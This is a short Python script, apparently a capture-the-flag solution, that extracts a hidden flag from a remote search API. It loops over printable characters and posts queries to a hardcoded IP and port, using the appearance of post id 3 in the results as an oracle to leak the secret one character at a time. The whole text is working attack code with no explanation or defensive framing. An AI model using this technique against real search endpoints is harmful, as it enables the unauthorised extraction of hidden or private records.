import requests
import string

URL = "http://34.134.162.213:17000/api/search"
CHARSET = ''.join(chr(c) for c in range(32, 127))
flag = "L3AK{L"

def search(query):
    response = requests.post(URL, json={"query": query})
    if response.status_code == 200:
        results = response.json().get('results', [])
        for post in results:
            if post.get('id') == 3:
                return True
    return False

while not flag.endswith("}"):
    found = False
    for ch in CHARSET:
        trial = flag[-2:] + ch  
        if (trial == "L3A") or (trial == "3AK") or (trial == "AK{"):
            continue
        if search(trial):
            flag += ch
            print(f"Found next char: {ch} -> {flag}")
            found = True
            break
    if not found:
        print("No matching character found. Possibly an error.")
        break

            